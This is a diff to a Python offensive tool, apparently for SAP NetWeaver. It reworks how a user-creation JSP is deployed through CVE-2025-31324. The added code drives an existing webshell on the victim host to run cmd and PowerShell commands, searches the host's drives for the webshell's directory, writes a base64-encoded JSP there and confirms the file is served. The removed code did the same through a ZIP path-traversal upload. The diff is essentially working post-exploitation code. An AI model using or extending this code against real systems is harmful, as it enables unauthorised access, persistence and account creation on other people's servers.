@@ -485,89 +485,141 @@ def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
 # Deployment path 1: via CVE-2025-31324 (existing dropshell)
 # ---------------------------------------------------------------------------
 
-def deploy_create_user_jsp_via_cve_31324(node, writer_fn=None) -> dict:
-    """Drop the create-user JSP via CVE-2025-31324 metadatauploader.
+def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
+    """Drop the create-user JSP via CVE-2025-31324 command-write.
 
-    Re-uses the same ZIP path-traversal write that the initial webshell used
-    (relative path ``../apps/sap.com/irj/servlet_jsp/irj/root/<name>``,
-    resolved by the running deserialiser against its real app root).  The
-    old approach — writing to a guessed absolute path via an existing shell
-    — failed on systems where the runtime instance directory differs from
-    ``J<nr>`` (shared mounts, JC<nr>, non-default drive), so we skip that
-    route entirely.
+    Uses the existing webshell (landed by the metadatauploader ZIP drop) to:
 
-    ``writer_fn`` is accepted and ignored for backwards-compatibility with
-    the previous signature.
+      1. Locate its own ``<name>.jsp`` on disk via ``dir /s /b`` — that
+         directory IS the real served ``irj/root``.  No guesses, no
+         hard-coded ``C:\\usr\\sap\\<SID>\\J<nr>\\...`` path that breaks on
+         JC<nr> / shared mounts / non-default drives.
+      2. Write the UME JSP to that discovered directory via PowerShell
+         ``[IO.File]::WriteAllBytes`` on a base64 blob.
+      3. GET-probe the resulting ``/irj/<name>.jsp`` URL — if it's 200 the
+         deploy is confirmed, otherwise we fail fast with a clear message.
 
-    Returns dict: {success, jsp_url, jsp_name, error, method}.
+    ``writer_fn`` is a callable (typically
+    ``sapmap_exploit.execute_cve_2025_31324_via_shell``) that takes a
+    single shell-command string and returns ``{success, output, error}``.
+    It must auto-drop a webshell if one isn't already present.
+
+    Returns dict: {success, jsp_url, jsp_name, error, target_path, method}.
     """
-    _ = writer_fn  # unused (kept for API compatibility)
     sid = node.sid
     port = getattr(node, "cve_2025_31324_port", 0)
     if not port or port < 50000:
         return {"success": False, "error": "no Java HTTP port known"}
+    if writer_fn is None:
+        return {"success": False, "error": "writer_fn required"}
+
+    # --- Step 1: ensure webshell is up and prime the shells list ---
+    prime = writer_fn("echo sapmap_prime")
+    prime_out = " ".join(str(l) for l in (prime.get("output") or []))
+    if "sapmap_prime" not in prime_out:
+        return {"success": False,
+                "error": f"webshell unusable — prime returned: "
+                         f"{prime_out[:200] or prime.get('error', '?')}"}
+
+    shells = getattr(node, "cve_2025_31324_shells", []) or []
+    if not shells:
+        return {"success": False,
+                "error": "no webshell dropped on node.cve_2025_31324_shells"}
+    shell_name = shells[-1].get("name", "")
+    if not shell_name:
+        return {"success": False,
+                "error": "webshell record missing 'name' — cannot search for it"}
+
+    def _parse_path_from_output(lines, expected_basename: str) -> str:
+        for line in lines or []:
+            s = str(line).strip()
+            if not s or ":\\" not in s:
+                continue
+            if s.lower().endswith(expected_basename.lower()):
+                # strip off the filename → directory
+                idx = s.rfind("\\")
+                if idx > 2:
+                    return s[:idx]
+        return ""
+
+    # --- Step 2: locate the webshell on disk (= real irj/root) ---
+    dir_path = ""
+    for drive in ("C", "D", "E", "F"):
+        cmd = f"dir /s /b {drive}:\\usr\\sap\\{shell_name} 2>nul"
+        r = writer_fn(cmd)
+        dir_path = _parse_path_from_output(r.get("output") or [], shell_name)
+        if dir_path:
+            print(f"[*] {sid}: located webshell at {dir_path}\\{shell_name} "
+                  f"— using it as irj/root")
+            break
+
+    if not dir_path:
+        # Last-resort: PowerShell recursive search across all fixed drives.
+        # Avoids the cmd.exe drive-letter loop missing non-standard installs.
+        ps_find = (
+            "powershell.exe -NoProfile -Command "
+            "\"$r=Get-PSDrive -PSProvider FileSystem|%{$_.Root};"
+            f"foreach($d in $r){{$f=Get-ChildItem -Path $d -Recurse -Filter "
+            f"{shell_name} -ErrorAction SilentlyContinue|Select -First 1;"
+            "if($f){$f.DirectoryName;break}}\"")
+        r = writer_fn(ps_find)
+        dir_path = _parse_path_from_output(r.get("output") or [], "")
+        # The PS one-liner returns just the directory, so no basename to match.
+        # Pick the first line that looks absolute-pathy.
+        if not dir_path:
+            for line in r.get("output") or []:
+                s = str(line).strip()
+                if s and len(s) > 3 and s[1:3] == ":\\":
+                    dir_path = s
+                    break
+        if dir_path:
+            print(f"[*] {sid}: located webshell dir via PS search: {dir_path}")
+
+    if not dir_path:
+        return {"success": False,
+                "error": (f"could not locate webshell {shell_name} on disk "
+                          f"under any drive's \\usr\\sap tree — "
+                          f"cannot determine real irj/root")}
+
+    # --- Step 3: write the UME JSP to the discovered directory ---
+    jsp_name = _random_jsp_name("ume")
+    target_path = f"{dir_path}\\{jsp_name}"
+    jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")
+    ps_cmd = (f"[IO.File]::WriteAllBytes('{target_path}',"
+              f"[Convert]::FromBase64String('{jsp_b64}'))")
+    full = f"powershell.exe -NoProfile -Command {ps_cmd}"
+    wr = writer_fn(full)
+    if not wr.get("success"):
+        return {"success": False,
+                "error": f"PowerShell write failed: {wr.get('error', '?')}",
+                "target_path": target_path}
+
+    # --- Step 4: GET-probe to confirm the JSP is actually served ---
+    scheme = "https" if getattr(node, "cve_2025_31324_https", False) else "http"
+    host = node.ip or node.hostname
+    jsp_url = f"{scheme}://{host}:{port}/irj/{jsp_name}"
 
     try:
-        from sap_cve_2025_31324 import exploit_cve_2025_31324_dropshell
-    except Exception as e:
+        ctx = ssl._create_unverified_context()
+        req = urllib.request.Request(jsp_url, headers={"User-Agent": _UA})
+        with urllib.request.urlopen(req, timeout=10, context=ctx) as pr:
+            probe_status = pr.status
+    except urllib.error.HTTPError as e:
+        probe_status = e.code
+    except (urllib.error.URLError, TimeoutError, OSError) as e:
         return {"success": False,
-                "error": f"sap_cve_2025_31324 module not importable: {e}"}
+                "error": (f"JSP written to {target_path} but probe failed: "
+                          f"{e}"),
+                "jsp_url": jsp_url, "target_path": target_path}
 
-    host = node.ip or node.hostname
-    https = bool(getattr(node, "cve_2025_31324_https", False))
-    jsp_name = _random_jsp_name("ume")
+    if probe_status != 200:
+        return {"success": False,
+                "error": (f"JSP written to {target_path} but GET {jsp_url} "
+                          f"returned HTTP {probe_status}"),
+                "jsp_url": jsp_url, "target_path": target_path}
 
-    # The drop function classifies success by the "cause - getter
-    # getoutputproperties" exception trail.  Some servers (SJJ observed)
-    # suppress that trail and return HTTP 200 with an empty body even when
-    # the write succeeds — so we ignore the classifier's flag and probe the
-    # JSP URL directly as ground truth (mirrors drop_cve_2025_31324_shell's
-    # approach for the webshell drop).
-    drop = exploit_cve_2025_31324_dropshell(
-        host=host, port=port, use_https=https,
-        shell_name=jsp_name, jsp_content=UME_CREATE_JSP, timeout=20.0)
-
-    jsp_url = drop.get("shell_url") or \
-              f"{'https' if https else 'http'}://{host}:{port}/irj/{jsp_name}"
-
-    def _probe(url: str) -> int:
-        try:
-            ctx = ssl._create_unverified_context()
-            req = urllib.request.Request(url, headers={"User-Agent": _UA})
-            with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
-                return r.status
-        except urllib.error.HTTPError as e:
-            return e.code
-        except (urllib.error.URLError, TimeoutError, OSError):
-            return 0
-
-    probe_status = _probe(jsp_url)
-
-    if probe_status == 200:
-        return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
-                "target_path": "(metadatauploader-relative)",
-                "method": "cve_31324",
-                "used_uid": drop.get("used_uid", "")}
-
-    # Probe failed — give whichever signal is most actionable.
-    if probe_status == 404:
-        error = (f"JSP deployed but GET {jsp_url} returned 404 — the "
-                 f"metadatauploader write did not land in the served "
-                 f"irj/root (possibly a non-default cluster layout)")
-    elif probe_status == 0:
-        error = f"JSP probe network error against {jsp_url}"
-    else:
-        error = f"JSP probe returned HTTP {probe_status} at {jsp_url}"
-
-    # If the drop itself was never classified as successful either, surface
-    # that context too — it helps distinguish "write rejected" from
-    # "write accepted but served-path mismatch".
-    if not drop.get("success"):
-        error += (f" · drop-phase: HTTP {drop.get('http_status')} "
-                  f"— {drop.get('evidence', '?')}")
-
-    return {"success": False, "error": error, "jsp_url": jsp_url,
-            "http_status": probe_status}
+    return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
+            "target_path": target_path, "method": "cve_31324"}
 
 
 # ---------------------------------------------------------------------------
